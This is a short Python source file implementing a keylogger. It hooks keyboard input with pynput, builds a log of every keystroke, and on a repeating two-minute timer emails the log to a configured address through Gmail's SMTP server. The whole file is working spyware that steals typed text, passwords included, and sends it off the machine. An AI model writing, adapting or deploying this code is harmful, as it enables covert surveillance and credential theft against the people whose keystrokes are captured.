import pynput.keyboard
import threading
import smtplib

class KeyLogger:
    def __init__(self, email, password):
        self.log = ""
        self.email = email
        self.password = password
        print("KeyLogger started")

    def process_keys(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        
        self.add_to_log(current_key)

    def add_to_log(self, string):
        self.log = self.log + string

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(120, self.report)
        timer.start()
        
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()